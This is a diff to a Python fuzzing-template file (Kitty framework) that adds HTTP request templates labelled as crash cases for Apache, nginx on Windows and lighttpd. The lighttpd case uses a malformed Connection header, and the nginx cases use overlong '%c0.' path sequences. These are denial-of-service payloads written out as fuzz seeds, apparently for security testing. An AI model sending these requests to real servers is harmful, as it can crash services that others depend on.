@@ -12,9 +12,44 @@ from kitty.model import *
 
 http_apache_crash = Template(
 	name = 'HTTP_APACHE_CRASH', fields = [
-		Static('\x16\x03\x03'),
+		String('\x16\x03\x03'),
 		Static('\r\n\r\n', name='eom')]
 	)
+
+http_nginx_win_crash_1 = Template(
+	name = 'HTTP_NGINX_CRASH_1', fields =[
+		Static('GET '),
+		String('/%c0./%c0./%c0.%c0./%c0.%c0./%c0.%c0./%20'),
+		Static('HTTP/1.1'),
+		Static('\r\n\r\n', name='eom')
+		]
+	)
+
+http_nginx_win_crash_2 = Template(
+	name = 'HTTP_NGINX_CRASH_2', fields =[
+		Static('GET '),
+		String('/%c0./%c0./%c0.%c0./%c0.%c0./%20'),
+		Static('HTTP/1.1'),
+		Static('\r\n\r\n', name='eom')
+		]
+	)
+
+http_nginx_win_crash_3 = Template(
+	name = 'HTTP_NGINX_CRASH_3', fields =[
+		Static('GET '),
+		String('/%c0./%c0./%c0.%c0./%20'),
+		Static('HTTP/1.1'),
+		Static('\r\n\r\n', name='eom')
+		]
+	)
+
+http_lighttpd_crash = Template(
+	name = 'HTTP_LIGHTTPD_CRASH', fields =[
+		String('GET / HTTP/1.1\r\nHost: pwn.ed\r\nConnection: TE,,Keep-Alive\r\n\r\n')
+		]
+	)
+
+
 
 http_get = Template(
 	name = 'HTTP_GET', fields = [
@@ -116,8 +151,8 @@ http_get = Template(
 	]
 )
 
-http_post_basic = Template(
-	name = 'HTTP_POST_Basic',
+http_post = Template(
+	name = 'HTTP_POST',
 	fields = [
 		Static('POST', name='method'),
 		Delimiter(' ', name='space1'),
